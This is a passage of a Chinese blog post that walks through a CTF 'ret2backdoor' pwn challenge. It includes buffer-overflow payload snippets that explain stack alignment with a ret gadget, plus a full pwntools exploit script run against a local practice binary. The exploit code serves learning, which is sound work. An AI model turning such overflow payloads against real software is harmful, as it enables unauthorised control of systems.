+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaa&#x27;</span></span><br><span class="line">payload += p64(<span class="number">0x402008</span>) <span class="comment"># rbp</span></span><br><span class="line">payload += p64(<span class="number">0x401210</span>) <span class="comment"># ret</span></span><br><span class="line">payload += p64(<span class="number">0x4011E1</span>)    </span><br></pre></td></tr></table></figure>
+
+<p>没对齐的情况，返回地址是0x4011E1，往前走两个就是kaaalaaa，所以rsp指向kaaalaaa</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaa&#x27;</span></span><br><span class="line">payload += p64(<span class="number">0x402008</span>) <span class="comment"># rbp</span></span><br><span class="line">payload += p64(<span class="number">0x4011E1</span>)    </span><br></pre></td></tr></table></figure>
+
+<p>算了别管我在说什么</p>
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> CDLL</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io = process(<span class="string">&#x27;./ret2locked_backdoor.backdoor&#x27;</span>)             <span class="comment"># 在本地运行程序。</span></span><br><span class="line">gdb.attach(io, <span class="string">&quot;b backdoor&quot;</span>)                    <span class="comment"># 启动 GDB</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaa&#x27;</span></span><br><span class="line">payload += p64(<span class="number">0x402008</span>) <span class="comment"># rbp</span></span><br><span class="line">payload += p64(<span class="number">0x401210</span>) <span class="comment"># ret</span></span><br><span class="line">payload += p64(<span class="number">0x4011E1</span>)    </span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">pause()	</span><br><span class="line"></span><br><span class="line"><span class="comment"># 尝试交互</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>本文作者： </strong>Mintind
+  </li>
+  <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="https://mintind.github.io/2025/11/23/CTF/PWN/ret2backdoor_by_Jmp.Cliff/" title="【PWN】ret2backdoor by Jmp.Cliff">https://mintind.github.io/2025/11/23/CTF/PWN/ret2backdoor_by_Jmp.Cliff/</a>
+  </li>
+  <li class="post-copyright-license">
+      <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</span> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/CTF/" rel="tag"># CTF</a>
+              <a href="/tags/PWN/" rel="tag"># PWN</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2025/11/20/Notes/little_notes/" rel="prev" title="little notes">
+                  <i class="fa fa-angle-left"></i> little notes
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2025/11/23/CTF/PWN/BUUCTF_jarvisoj_level0_1/" rel="next" title="[BUUCTF]jarvisoj_level0 1">
+                  [BUUCTF]jarvisoj_level0 1 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+  <div class="languages">
+    <label class="lang-select-label">
+      <i class="fa fa-language"></i>
+      <span>简体中文</span>
+      <i class="fa fa-angle-up" aria-hidden="true"></i>
+    </label>
+    <select class="lang-select" data-canonical="" aria-label="选择语言">
+      
+        <option value="zh-CN" data-href="/2025/11/23/CTF/PWN/ret2backdoor_by_Jmp.Cliff/" selected="">
+          简体中文
+        </option>
+      
+        <option value="en" data-href="/en/2025/11/23/CTF/PWN/ret2backdoor_by_Jmp.Cliff/" selected="">
+          English
+        </option>
+      
+    </select>
+  </div>
+
+  <div class="copyright">
+    &copy; 2025 – 
+    <span itemprop="copyrightYear">2026</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Mintind</span>
+  </div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+    <span title="站点总字数">203k</span>
+  </span>
+</div>
+  <div class="powered-by">由 <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & <span class="exturl" data-url="aHR0cHM6Ly90aGVtZS1uZXh0LmpzLm9yZw==">NexT.Gemini</span> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
